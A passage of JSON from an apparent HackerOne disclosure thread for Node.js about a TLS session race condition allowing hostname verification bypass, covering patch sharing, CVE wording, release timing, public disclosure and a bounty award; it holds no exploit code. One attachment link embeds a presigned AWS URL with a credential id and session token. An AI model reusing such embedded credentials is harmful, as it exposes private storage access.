\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-30T16:55:19.371Z","updated_at":"2020-03-30T16:55:19.371Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7485224,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Felix,\n\nI've attached the latest patch to this message. Please let me know if you can't access it!\n\nThe review is still going on. We will post an update once we'll know the release date!\n\nThank you for your patience,\nFedor.","markdown_message":"\u003cp\u003eHello Felix,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve attached the latest patch to this message. Please let me know if you can\u0026#39;t access it!\u003c/p\u003e\n\n\u003cp\u003eThe review is still going on. We will post an update once we\u0026#39;ll know the release date!\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience,\u003cbr\u003e\nFedor.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-30T18:41:44.895Z","updated_at":"2020-03-30T18:41:44.895Z","actor":{"username":"indutny","cleared":false,"url":"/indutny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":766542,"filename":"200.diff","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yHT2Tu4csvDL5RUN5ZUZH5Ep?response-content-disposition=attachment%3B%20filename%3D%22200.diff%22%3B%20filename%2A%3DUTF-8%27%27200.diff\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065704Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=eb58cf12200748b3e99d0203cc493632dac8ff22b33e8ece290f07f6bc740411"}],"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8005440,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can someone suggest the text to use for the CVE description? It must match this very specific format: `PROBLEM TYPE` in `PRODUCT/VERSION` causes `IMPACT` when `ATTACK`","markdown_message":"\u003cp\u003eCan someone suggest the text to use for the CVE description? It must match this very specific format: \u003ccode\u003ePROBLEM TYPE\u003c/code\u003e in \u003ccode\u003ePRODUCT/VERSION\u003c/code\u003e causes \u003ccode\u003eIMPACT\u003c/code\u003e when \u003ccode\u003eATTACK\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-15T00:31:31.361Z","updated_at":"2020-05-15T00:31:31.361Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8005474,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What is suggested CVSS rating for this?","markdown_message":"\u003cp\u003eWhat is suggested CVSS rating for this?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-15T00:46:58.753Z","updated_at":"2020-05-15T00:46:58.753Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8134389,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Apologies, I missed the updates on this. \n@indutny The patch looks good to me. We are pretty close to the 90 day deadline (2020-06-03), do you plan to release the update before that date? (In case it is necessary, we do offer a 14-day grace extension if a patch is planned to be released within the 2 weeks following the original deadline. )\n\n@octetcloud  Maybe something like \"Race Condition in Node.JS XY TLS Session Handling causes hostname verification bypass\" for the CVE description? No idea re CVSS rating. ","markdown_message":"\u003cp\u003eApologies, I missed the updates on this. \u003cbr\u003e\n\u003ca href=\"/indutny\"\u003e@indutny\u003c/a\u003e The patch looks good to me. We are pretty close to the 90 day deadline (2020-06-03), do you plan to release the update before that date? (In case it is necessary, we do offer a 14-day grace extension if a patch is planned to be released within the 2 weeks following the original deadline. )\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/octetcloud\"\u003e@octetcloud\u003c/a\u003e  Maybe something like \u0026quot;Race Condition in Node.JS XY TLS Session Handling causes hostname verification bypass\u0026quot; for the CVE description? No idea re CVSS rating. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-28T17:21:27.146Z","updated_at":"2020-05-28T17:21:27.146Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8135599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My apologies, there is a lot of manual notifications and coordinations in our process, and telling all the reporters of the release date is missing from it ATM.\n\nFix is planned for June 2nd.\n\nAnnouncement: https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/\n\nIt doesn't mention this report specifically of course.","markdown_message":"\u003cp\u003eMy apologies, there is a lot of manual notifications and coordinations in our process, and telling all the reporters of the release date is missing from it ATM.\u003c/p\u003e\n\n\u003cp\u003eFix is planned for June 2nd.\u003c/p\u003e\n\n\u003cp\u003eAnnouncement: \u003ca title=\"https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fen%2Fblog%2Fvulnerability%2Fjune-2020-security-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/en/blog/vulnerability/june-2020-security-releases/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt doesn\u0026#39;t mention this report specifically of course.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-28T18:21:36.297Z","updated_at":"2020-05-28T18:21:36.297Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8182766,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/","markdown_message":"\u003cp\u003e\u003ca title=\"https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fen%2Fblog%2Fvulnerability%2Fjune-2020-security-releases%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/en/blog/vulnerability/june-2020-security-releases/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T19:56:01.859Z","updated_at":"2020-06-02T19:56:01.859Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"fwilhelm","url":"/fwilhelm"},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8182769,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T19:56:09.902Z","updated_at":"2020-06-02T19:56:09.902Z","first_to_agree":true,"actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8185876,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks Sam! ","markdown_message":"\u003cp\u003eThanks Sam! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-03T06:55:54.082Z","updated_at":"2020-06-03T06:55:54.082Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8185877,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-03T06:55:54.303Z","updated_at":"2020-06-03T06:55:54.303Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8610782,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-15T17:38:44.842Z","updated_at":"2020-07-15T17:38:44.842Z","actor":{"url":"/nodejs","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nodejs","collaborator":{"username":"fwilhelm","url":"/fwilhelm"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}